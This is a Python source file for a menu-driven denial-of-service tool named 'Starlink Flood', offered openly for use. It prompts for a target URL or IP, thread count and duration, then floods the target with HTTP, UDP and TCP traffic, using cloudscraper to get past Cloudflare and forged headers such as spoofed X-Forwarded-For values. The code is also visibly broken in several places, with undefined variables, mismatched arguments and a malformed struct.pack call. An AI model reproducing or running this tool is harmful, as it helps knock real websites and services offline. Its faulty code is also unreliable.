import cloudscraper, threading, requests, time, os, socket, httpx, asyncio, struct

if os.name == 'posix':
    os.system('clear')
elif os.name == 'nt':
    os.system('cls')    
    
bl = '\033[1;34m'
rd = '\033[91m'
wt = '\033[0m'
yl = '\033[1;33m'
gr = '\033[1;32m'
def heads2():
    h = {
      "content-length": "1000000000000000000",
      "connection": "keep-alive",
      "user-agent": "GoogleBot V3",
      "x-forwarded-from": "0.0.0.0",
      "content-type": "application/xml",
      "set-cookie": "v=xxxxXxxxxxx;&vx=#xxxxxxxxxxxxxxxx0x;;d;"
    }
    return h
def data():
    data = {
      "X": "xXxxX",
      "Y": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      "Z": "ZzzzZzzzzZzzzZzZZzZzzZzzZZZzzZ",
      "1": "111111111111111111111111111111"
    }
    return data    
def main():
    if os.name == 'posix':
        os.system('clear')
    elif os.name == 'nt':
        os.system('cls')   
    print('Welcome To Starlink Flood !')
    print("\t\tType 'help' for help\n")
def help():
    if os.name == 'posix':
        os.system('clear')
    elif os.name == 'nt':
        os.system('cls')   
    print("Layer 7 : pps, cfb, http, sky, deaddos")
    print("Layer 4 : udp, tcp \nType 'back' to the main page\n\n")    
def heads(url):
    header = {
        "User-Agents": "TornadoCFB 1-1/MXOzzila\n",
        "Host": url+'\n',
        "Connection": "keep-alive\n",
        "X-Forwaded-For": "192.000.1.1\n",
        "X-Real-IP": "192.000.1.1\n",
        "Connection-Length": "55\n",
        "X-Client-IP": "192.000.1.1\n",
        "Content-Type": "text/html; charset=UTF-8\n"
    }
    return header
def CloudByPass():
    def CFB(url, threadsi, t):
        threadsc = int(0)
        cfb = cloudscraper.create_scraper()
        while threadsc <= int(threadsi):
            try:
                t = threading.Thread(target=SendReq, args=(url, thread, t))
                t.start()
                threadsc += 1
            except:
                pass
    def SendReq(url, cfb, t):
        header = heads(url)
        header2 = heads2()
        data = data()
        while int(t) > 0:
            try:
                cfb.get(url, timeout=1)
                requests.get(url, timeout=1, headers=header)
                requests.get(url, timeout=1, headers=header2, verify=False, data=data)
            except:
                pass
    if __name__ == '__main__':
        url = input("Target Url ==> ")
        threadsi = input("Threads ==> ")
        t = input("Time ==> ")
        CFB(url, threadsi, t)
        time.sleep(t)
        print("=Attack Complete=")
        exit()
def PPS():
    def HTTPSend(url, threadsi, t, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        thrdsc = int(0)
        while thrdsc <= int(threadsi):
            try:
                tr = threading.Thread(target=StartHTTP, args=(url, thread, t))
                tr.start()
                thrdsc += 1
            except:
                pass
    def StartHTTP(url, s, t, port):
        while int(t) > 0:
            try:
                s.connect((url, port))
                s.sendto(('GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\nConnection-Length: 55\r\n').format(url), (url, port))
                s.close()
                requests.get(url)
            except:
                pass
    if __name__ == '__main__':
        url = input("Target Url ==> ")
        port = input("Port ==> ")
        threadsi = input("Threads ==> ")
        t = input("Time ==> ")       
        HTTPSend(url, threadsi, t, port)
        time.sleep(t)
        print("=Attack Complete=")
        exit()
def HTTPFlood():
    def HFlood(url, threadsi, t):
        c = int(0)
        while c <= int(threadsi):
            try:
                t = threading.Thread(target=startHTTPf, args=(url, t))
                t.start()
                c += 1
            except:
                pass
    def startHTTPf(url, t):
        while int(t) > 0:
            try:
                header = heads()
                requests.get(url, headers=header, timeout=1)
            except:
                pass
    if __name__ == '__main__':
        url = input("Target Url ==> ")
        threadsi = input("Threads ==> ")
        t = input("Time ==> ")      
        HFlood(url, threadsi, t)
        time.sleep(t)
        print("=Attack Completed=")
        exit()
def Sky():
    def SSky(url, threadsi, t):
        cont = int(0)
        cfbs = cloudscraper.create_scraper()
        while cont <= int(threadsi):
            try:
                ts = threading.Thread(target=ASky, args=(url, threadsi, t)) 
                ts.start()
                cont += 1
            except:
                pass
    def ASky(url, cfbs, t):
        header = heads(url)
        while int(t) > 0:
            try:
                httpx.get(url, headers=header, timeout=1)
                cfbs.get(url, timeout=1)
                requests.get(url, timeout=1, headers=header)
            except:
                pass
    if __name__ == '__main__':
        url = input("Target Url ==> ")
        threadsi = input("Thread ==> ")
        t = input("Time ==> ")
        SSky(url, threadsi, t)
        time.sleep(t)
        exit()
def udp():
    def udp_header(port):
        source_port = 8080
        destination_port = port
        length = 8
        checksum = 0
        udp_headers = struct.pack('!HHHH', source_port, destination_port, length, checksum)
        return udp_headers
    def startudp(ip, port, t, threadsi):
        cs = int(0)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while cs <= int(threadsi):
            try:
                thr = threading.Thread(target=Audp, args=(ip, port, s, t))
                thr.start()
                cs += 1
            except:
                pass
    def Audp(ip, port, s, t):
        while int(t) > 0:
            try:
                udph = udp_header()
                s.sendto(udph, (ip,port))
            except:
                pass
    if __name__ == '__main__':
        ip = input("Target IP ==> ")
        port = input("Port ==> ")
        threadsi = input("Thread ==> ")
        t = input("Time ==> ")
        startudp(ip, port, threadsi, t)
        time.sleep(int(t))
        exit()
def tcp():
    def tcp_header(port):
        source_port = 12345
        destination_port = port
        sequence_number = 0
        acknowledgment_number = 0
        data_offset = 5
        reserved = 0
        urg = 0
        ack = 0
        psh = 0
        rst = 0
        syn = 1
        fin = 0
        window = socket.htons(5840)
        checksum = 0
        urgent_pointer = 0
        tcp_header = struct.pack("!HHLLBBHHH", source_port, destination_port, sequence_number, acknowledgment_number, data_offset, reserved, urg, ack, psh, rst, syn, fin, window, checksum, urgent_pointer)
        return tcp_headers
    def starttcp(ip, port, t, threadsi):
        cs = int(0)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while cs <= int(threadsi):
            try:
                thr = threading.Thread(target=Atcp, args=(ip, port, s, t))
                thr.start()
                cs += 1
            except:
                pass
    def Atcp(ip, port, s, t):
        while int(t) > 0:
            try:
                udph = tcp_header(port)
                s.sendto(udph, (ip,port))
            except:
                pass
    if __name__ == '__main__':
        ip = input("Target IP ==> ")
        port = input("Port ==> ")
        threadsi = input("Thread ==> ")
        t = input("Time ==> ")
        starttcp(ip, port, threadsi, t)
        time.sleep(int(t))
        exit()        
def deadly():
    data = {
      "X": "xXxxX",
      "Y": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      "Z": "ZzzzZzzzzZzzzZzZZzZzzZzzZZZzzZ",
      "1": "111111111111111111111111111111"
    }
    def startdeaddos(url, threadsi, t):      
        header = heads(url)
        header2 = heads2()
        cos = int(0)
        cf = cloudscraper.create_scraper()
        def requestor(url):  
            requests.get(url, timeout=1, headers=header2, verify=False, data=data)
            httpx.get(url, timeout=1, headers=header2, verify=False, data=data)
            cf.get(url, timeout=1, headers=header2, verify=False, data=data)
        while cos <= int(threadsi):
            try:
                ta = threading.Thread(target=startdead, args=(url, requestor, t))
                ta.start()
                cos += 1
            except:
                pass
    def startdead(url, requestor, t):
        while int(t) > 0:
            try:
                requestor(url)
            except:
                pass
    if __name__ == '__main__':
        url = input("Target Url ==> ")
        threadsi = input("Thread ==> ")
        t = input("Time ==> ")
        startdeaddos(url, threadsi, t)
if __name__ == '__main__':
    main()
    a = input(f"{bl}Starlink{wt}@{bl}root{wt}~$ ")
    while a != 'exit':
        a = input(f"{bl}Starlink{wt}@{bl}root{wt}~$ ")
        if a.lower() == 'cfb':
            CloudByPass()
        elif a.lower() == 'pps':
            PPS()
        elif a.lower() == 'http':
            HTTPFlood()    
        elif a.lower() == 'sky':
            Sky()    
        elif a.lower() == 'udp':
            udp()    
        elif a.lower() == 'tcp':
            tcp()
        elif a.lower() == 'deaddos':
            deadly()
        elif a.lower() == 'exit':
            exit()    
        elif a.lower() == 'help':
            help()    
        elif a.lower() == 'back':
            main()
